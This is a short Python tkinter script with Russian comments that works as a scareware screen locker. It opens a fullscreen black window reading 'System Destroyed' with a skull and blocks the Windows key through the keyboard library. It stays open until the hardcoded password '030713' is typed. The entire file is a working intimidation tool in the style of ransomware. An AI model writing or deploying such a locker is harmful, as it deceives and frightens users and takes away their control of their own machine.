import tkinter as tk
from tkinter import messagebox
import keyboard

import keyboard; keyboard.block_key('Win')
def submit_password():
    if entry.get() == "030713":
        messagebox.showinfo("Доступ","Доступ предоставлен.")
        root.destroy()  # Закрытие приложения при правильном пароле
    else:
        messagebox.showerror("Ошибка", "Неверный пароль!")

def disable_windows_key(event):
    return "break"

# Создание основного окна
root = tk.Tk()
root.title("Доступ к системе")
root.attributes('-fullscreen', True)  # Полноэкранный режим
root.configure(bg='black')

# Отключение кнопки Windows
root.bind("<KeyPress>", disable_windows_key)

uiwre = tk.Label(root, text="System Destroyed", font=("Helvetica", 60), bg='black', fg='red')
uiwre.pack(pady=20)

# Заголовок с черепом
skull_label = tk.Label(root, text="💀", font=("Helvetica", 100), bg='black', fg='red')
skull_label.pack(pady=20)

# Поле для ввода пароля
entry = tk.Entry(root, show='*', font=("Helvetica", 24), bg='red', fg='black')
entry.pack(pady=20)

# Кнопка для подтверждения пароля
submit_button = tk.Button(root, text="Войти", command=submit_password, font=("Helvetica", 24), bg='red', fg='black')
submit_button.pack(pady=20)

# Запуск главного цикла
root.mainloop()

